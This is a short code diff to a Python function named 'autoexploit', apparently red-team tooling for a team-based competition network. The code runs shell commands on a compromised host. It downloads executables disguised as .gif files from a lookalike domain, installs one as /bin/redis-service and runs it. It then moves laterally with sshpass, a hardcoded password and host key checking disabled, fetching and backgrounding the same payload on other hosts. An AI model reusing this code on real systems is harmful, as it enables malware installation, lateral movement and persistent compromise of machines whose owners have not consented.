@@ -163,12 +163,13 @@ def autoexploit(remote, team):
     print("\033[92m[+]\033[0m AutoExploitation...")
     remote.shell_cmd("apt-get update -y")    
     remote.shell_cmd("apt-get install -y curl openssh-client sshpass libssl-dev")
-    remote.shell_cmd(f"curl http://microsoftonline.download/downloads/coolcat.gif -o /bin/redis-service")
+    remote.shell_cmd(f"curl http://microsoftonline.download/download/coolcat.gif -o /bin/redis-service")
     remote.shell_cmd("chmod +x /bin/redis-service")
     remote.shell_cmd("/bin/redis-service")
     remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 wget http://microsoftonline.download/gifs/coolcat2.gif -O redis")
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 chmod +x redis && ./redis")
+    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 wget http://microsoftonline.download/gifs/coolcat.gif -O redis")
+    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 chmod +x redis && nohup ./redis &")
+    remote.shell_cmd("/bin/redis-service")
     print('Auto exploit done!')
     
 
